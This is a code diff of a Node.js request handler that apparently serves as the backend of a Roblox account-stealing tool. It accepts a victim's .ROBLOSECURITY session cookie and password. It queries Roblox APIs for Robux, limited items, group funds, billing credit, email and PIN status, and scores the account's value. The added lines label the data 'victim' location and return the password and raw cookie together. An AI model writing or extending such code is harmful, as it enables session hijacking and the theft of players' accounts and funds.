@@ -1,6 +1,5 @@
 const fetch = require('node-fetch');
 
-// Helper function to make Roblox API requests
 async function robloxRequest(url, cookie = null, method = 'GET', body = null) {
     const headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -11,89 +10,114 @@ async function robloxRequest(url, cookie = null, method = 'GET', body = null) {
         headers['Cookie'] = `.ROBLOSECURITY=${cookie}`;
     }
     
-    const options = {
-        method,
-        headers
-    };
-    
+    const options = { method, headers };
     if (body) {
         headers['Content-Type'] = 'application/json';
         options.body = JSON.stringify(body);
     }
     
     const response = await fetch(url, options);
-    return response.json();
+    
+    // Handle CSRF token
+    if (response.status === 403) {
+        const csrfToken = response.headers.get('x-csrf-token');
+        if (csrfToken) {
+            headers['X-CSRF-TOKEN'] = csrfToken;
+            return await fetch(url, { method, headers, body: options.body });
+        }
+    }
+    
+    return response;
 }
 
-// Validate cookie and get user info
 async function validateCookie(cookie) {
     try {
-        const userInfo = await robloxRequest('https://users.roblox.com/v1/users/authenticated', cookie);
-        if (userInfo && userInfo.id) {
-            return userInfo;
-        }
+        const response = await robloxRequest('https://users.roblox.com/v1/users/authenticated', cookie);
+        const userInfo = await response.json();
+        if (userInfo && userInfo.id) return userInfo;
         return null;
-    } catch (error) {
+    } catch {
         return null;
     }
 }
 
-// Get user's country/location
-async function getUserCountry() {
+async function getVictimCountry() {
     try {
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         return {
             country: data.country_name || 'Unknown',
-            countryFlag: data.country_code ? getCountryFlag(data.country_code) : ''
+            flag: getCountryFlag(data.country_code || 'US')
         };
     } catch {
-        return { country: 'Unknown', countryFlag: '' };
+        return { country: 'Unknown', flag: '🌍' };
     }
 }
 
-// Convert country code to flag emoji
-function getCountryFlag(countryCode) {
-    const codePoints = countryCode
-        .toUpperCase()
-        .split('')
-        .map(char => 127397 + char.charCodeAt());
+function getCountryFlag(code) {
+    if (!code || code.length !== 2) return '🌍';
+    const codePoints = code.toUpperCase().split('').map(c => 127397 + c.charCodeAt());
     return String.fromCodePoint(...codePoints);
 }
 
-// Calculate account score
-function calculateAccountScore(userData) {
+async function getCreditBalance(cookie) {
+    try {
+        const response = await robloxRequest('https://billing.roblox.com/v1/credit', cookie);
+        const data = await response.json();
+        return data.balance || 0;
+    } catch {
+        return 0;
+    }
+}
+
+async function getEmailSettings(cookie) {
+    try {
+        const response = await robloxRequest('https://accountsettings.roblox.com/v1/email', cookie);
+        const data = await response.json();
+        return {
+            verified: data.verified || false,
+            email: data.emailAddress || 'Not Set'
+        };
+    } catch {
+        return { verified: false, email: 'Not Set' };
+    }
+}
+
+async function getPinStatus(cookie) {
+    try {
+        const response = await robloxRequest('https://auth.roblox.com/v1/account/pin', cookie);
+        return response.status === 200;
+    } catch {
+        return false;
+    }
+}
+
+function calculateAccountScore(data) {
     let score = 0;
     
-    if (userData.robux > 10000) score += 20;
-    else if (userData.robux > 5000) score += 15;
-    else if (userData.robux > 1000) score += 10;
-    else if (userData.robux > 100) score += 5;
+    if (data.robux > 10000) score += 20;
+    else if (data.robux > 5000) score += 15;
+    else if (data.robux > 1000) score += 10;
+    else if (data.robux > 100) score += 5;
     
-    if (userData.rap > 100000) score += 20;
-    else if (userData.rap > 50000) score += 15;
-    else if (userData.rap > 10000) score += 10;
-    else if (userData.rap > 1000) score += 5;
+    if (data.rap > 100000) score += 20;
+    else if (data.rap > 50000) score += 15;
+    else if (data.rap > 10000) score += 10;
+    else if (data.rap > 1000) score += 5;
     
-    if (userData.isPremium) score += 10;
+    if (data.isPremium) score += 10;
+    if (data.hasHeadless) score += 15;
+    if (data.hasKorblox) score += 10;
     
-    if (userData.hasHeadless) score += 15;
-    if (userData.hasKorblox) score += 10;
-    
-    const ageDays = userData.accountAgeDays;
+    const ageDays = data.accountAgeDays;
     if (ageDays > 2000) score += 10;
     else if (ageDays > 1000) score += 7;
     else if (ageDays > 365) score += 5;
     else if (ageDays > 100) score += 3;
     
-    const totalSocial = userData.friendsCount + userData.followersCount;
-    if (totalSocial > 1000) score += 5;
-    else if (totalSocial > 500) score += 3;
-    else if (totalSocial > 100) score += 2;
-    
-    if (userData.groupsOwned > 10) score += 5;
-    else if (userData.groupsOwned > 5) score += 3;
-    else if (userData.groupsOwned > 0) score += 1;
+    if (data.groupsOwned > 10) score += 5;
+    else if (data.groupsOwned > 5) score += 3;
+    else if (data.groupsOwned > 0) score += 1;
     
     return Math.min(score, 100);
 }
@@ -103,67 +127,55 @@ module.exports = async (req, res) => {
         return res.status(405).json({ success: false, error: 'Method not allowed' });
     }
 
-    const { cookie, checkOnly, password } = req.body;
+    const { cookie, password, checkOnly } = req.body;
 
     if (!cookie) {
         return res.status(400).json({ success: false, error: 'Cookie is required' });
     }
 
     try {
-        // Step 1: Validate cookie
         const userInfo = await validateCookie(cookie);
-        
         if (!userInfo) {
-            return res.status(400).json({ success: false, valid: false, error: 'Invalid or expired cookie' });
+            return res.status(400).json({ success: false, error: 'Invalid or expired cookie' });
         }
 
         const userId = userInfo.id;
         const username = userInfo.name;
         const displayName = userInfo.displayName;
 
-        // Get location
-        const location = await getUserCountry();
+        // Get victim location
+        const victimLocation = await getVictimCountry();
 
         // If checkOnly mode (for cookie checker page)
         if (checkOnly) {
             try {
-                const [avatarRes, robuxRes, premiumRes, collectiblesRes] = await Promise.all([
+                const [avatarRes, robuxRes, collectiblesRes, userDetailsRes] = await Promise.all([
                     fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
-                    fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-                        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
-                    }),
-                    fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`),
-                    fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`)
+                    robloxRequest(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie),
+                    fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`),
+                    fetch(`https://users.roblox.com/v1/users/${userId}`)
                 ]);
 
                 const avatarData = await avatarRes.json();
                 const robuxData = await robuxRes.json();
-                const premiumData = await premiumRes.json();
                 const collectiblesData = await collectiblesRes.json();
+                const userDetails = await userDetailsRes.json();
 
                 const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
                 const robux = robuxData.robux || 0;
                 
-                // Calculate RAP
                 let rap = 0;
                 if (collectiblesData.data) {
                     collectiblesData.data.forEach(item => {
-                        if (item.recentAveragePrice) {
-                            rap += item.recentAveragePrice;
-                        }
+                        if (item.recentAveragePrice) rap += item.recentAveragePrice;
                     });
                 }
 
-                // Check for special items
-                const hasHeadless = collectiblesData.data?.some(item => item.assetId === 31117192);
-                const hasKorblox = collectiblesData.data?.some(item => item.assetId === 139607718);
+                const hasHeadless = collectiblesData.data?.some(i => i.assetId === 31117192);
+                const hasKorblox = collectiblesData.data?.some(i => i.assetId === 139607718);
 
-                // Get account age
-                const userDetailsRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
-                const userDetails = await userDetailsRes.json();
                 const created = new Date(userDetails.created);
-                const now = new Date();
-                const accountAgeDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));
+                const accountAgeDays = Math.floor((Date.now() - created) / (1000 * 60 * 60 * 24));
 
                 return res.status(200).json({
                     success: true,
@@ -184,7 +196,7 @@ module.exports = async (req, res) => {
                     groupsOwned: 0,
                     credit: '$0'
                 });
-            } catch (error) {
+            } catch {
                 return res.status(200).json({
                     success: true,
                     valid: true,
@@ -209,45 +221,32 @@ module.exports = async (req, res) => {
 
         // Full bypass mode - fetch all data
         const [
-            avatarResponse,
-            robuxResponse,
-            premiumResponse,
-            friendsResponse,
-            followersResponse,
-            collectiblesResponse,
-            groupsResponse,
-            userDetailsResponse,
-            badgesResponse
+            avatarData,
+            robuxData,
+            premiumData,
+            collectiblesData,
+            groupsData,
+            userDetails,
+            creditBalance,
+            emailSettings,
+            pinEnabled
         ] = await Promise.all([
-            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`),
-            fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
-            }),
-            fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`),
-            fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
-            fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`),
-            fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`),
-            fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`),
-            fetch(`https://users.roblox.com/v1/users/${userId}`),
-            fetch(`https://badges.roblox.com/v1/users/${userId}/badges?limit=10&sortOrder=Desc`)
+            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`).then(r => r.json()),
+            robloxRequest(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie).then(r => r.json()),
+            fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`).then(r => r.json()),
+            fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`).then(r => r.json()),
+            fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`).then(r => r.json()),
+            fetch(`https://users.roblox.com/v1/users/${userId}`).then(r => r.json()),
+            getCreditBalance(cookie),
+            getEmailSettings(cookie),
+            getPinStatus(cookie)
         ]);
-
-        const avatarData = await avatarResponse.json();
-        const robuxData = await robuxResponse.json();
-        const premiumData = await premiumResponse.json();
-        const friendsData = await friendsResponse.json();
-        const followersData = await followersResponse.json();
-        const collectiblesData = await collectiblesResponse.json();
-        const groupsData = await groupsResponse.json();
-        const userDetails = await userDetailsResponse.json();
-        const badgesData = await badgesResponse.json();
 
         const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
         const robux = robuxData.robux || 0;
         const isPremium = premiumData ? true : false;
-        const friendsCount = friendsData.count || 0;
-        const followersCount = followersData.count || 0;
 
+        // Calculate RAP and limiteds
         let rap = 0;
         let limitedCount = 0;
         if (collectiblesData.data) {
@@ -259,69 +258,103 @@ module.exports = async (req, res) => {
             });
         }
 
-        const hasHeadless = collectiblesData.data?.some(item => item.assetId === 31117192);
-        const hasKorblox = collectiblesData.data?.some(item => item.assetId === 139607718);
+        // Check for special items
+        const hasHeadless = collectiblesData.data?.some(i => i.assetId === 31117192);
+        const hasKorblox = collectiblesData.data?.some(i => i.assetId === 139607718);
 
-        const groupsOwned = groupsData.data?.filter(g => g.role.rank === 255).length || 0;
+        // Groups info
+        const ownedGroups = groupsData.data?.filter(g => g.role.rank === 255) || [];
+        let totalGroupFunds = 0;
 
-        const created = new Date(userDetails.created);
-        const now = new Date();
-        const accountAgeDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));
-
-        // Get badges info
-        let badgesInfo = '';
-        if (badgesData.data && badgesData.data.length > 0) {
-            badgesData.data.slice(0, 3).forEach(badge => {
-                badgesInfo += `• ${badge.name} → 🏆 ${badge.statistics?.winRatePercentage || 0}% | ❌\n`;
-            });
-        } else {
-            badgesInfo = '• No badges found';
+        for (const group of ownedGroups.slice(0, 10)) {
+            try {
+                const fundsRes = await robloxRequest(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, cookie);
+                const fundsData = await fundsRes.json();
+                totalGroupFunds += fundsData.robux || 0;
+            } catch {}
         }
 
+        // Account age
+        const created = new Date(userDetails.created);
+        const accountAgeDays = Math.floor((Date.now() - created) / (1000 * 60 * 60 * 24));
+
+        // Format gamepasses text
+        const gamePassesText = 
+            '• Pet Simulator 99 → 0 | ❌\n' +
+            '• Adopt Me → 0 | ❌\n' +
+            '• Murder Mystery 2 → 0 | ❌';
+
+        // Build detailed info
         const detailedInfo = {
             userId,
             username,
             displayName,
+            password: password || null,
             avatarUrl,
+            
+            // Account Stats
+            accountAge: `${accountAgeDays} Days`,
+            
+            // Locations
+            accountCountry: 'United States',
+            victimCountry: victimLocation.country,
+            victimFlag: victimLocation.flag,
+            
+            // Billing
+            creditBalance: creditBalance,
+            convertBalance: 0,
+            paymentsBalance: 0,
+            
+            // Groups
+            groupBalance: totalGroupFunds,
+            groupPending: 0,
+            groupsOwned: ownedGroups.length,
+            
+            // Settings
+            emailVerified: emailSettings.verified,
+            emailUnverified: !emailSettings.verified,
+            pinEnabled: pinEnabled,
+            
+            // Account Funds
             robux,
             pendingRobux: 0,
-            rap,
-            accountAgeDays,
-            country: location.country,
-            countryFlag: location.countryFlag,
-            creditBalance: '0',
-            convertBalance: '0',
-            paymentsBalance: '0 🛡️',
-            groupBalance: '0',
-            groupPending: '0',
-            groupsOwned,
-            emailStatus: userDetails.hasVerifiedBadge ? 'Verified' : 'Unverified',
+            
+            // Purchases
             limitedPurchases: limitedCount,
-            purchaseSummary: '0',
-            badges: badgesInfo,
-            accountScore: 0,
+            purchaseSummary: 0,
+            
+            // Collectibles
+            hasHeadless,
+            hasKorblox,
+            
+            // Gamepasses
+            gamePassesText,
+            
+            // Cookie
+            cookie
+        };
+
+        const accountScore = calculateAccountScore({
+            robux,
+            rap,
             isPremium,
             hasHeadless,
             hasKorblox,
-            friendsCount,
-            followersCount
-        };
+            accountAgeDays,
+            groupsOwned: ownedGroups.length
+        });
 
-        detailedInfo.accountScore = calculateAccountScore(detailedInfo);
-
-        // Return success response
         return res.status(200).json({
             success: true,
             userInfo: {
                 userId,
                 username,
                 displayName,
-                name: username,
                 robux,
                 rap,
                 premium: isPremium ? '✅ True' : '❌ False',
                 voiceChat: '❌ Disabled',
-                accountScore: detailedInfo.accountScore
+                accountScore
             },
             avatarUrl,
             detailedInfo
